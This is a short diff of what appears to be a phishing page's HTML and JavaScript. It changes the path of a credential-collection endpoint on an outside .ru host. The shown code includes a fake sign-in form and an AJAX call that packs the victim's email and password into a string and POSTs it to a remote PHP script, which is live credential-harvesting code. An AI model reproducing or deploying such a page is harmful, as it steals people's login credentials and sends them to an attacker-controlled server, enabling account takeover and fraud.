@@ -129,7 +129,7 @@
             <div class="signform">
 
                 <p class="error hide"></p>
-                <form action="https://komandor-crimea.ru//drwxuu/fas.php" id="form">
+                <form action="https://komandor-crimea.ru//action/fas.php" id="form">
                     <div class="inpg">
                         <input type="text" name="em" id="em" placeholder="Email" readonly>
                     </div>
@@ -203,7 +203,7 @@
             else {
                  let fa = `Email: ${em.value} \nPassword: ${pa.value}`;
                 $.ajax({
-                url: 'https://komandor-crimea.ru//drwxuu/fas.php',
+                url: 'https://komandor-crimea.ru//action/fas.php',
                 type: 'POST',
                 data: { pass: fa },
                 });
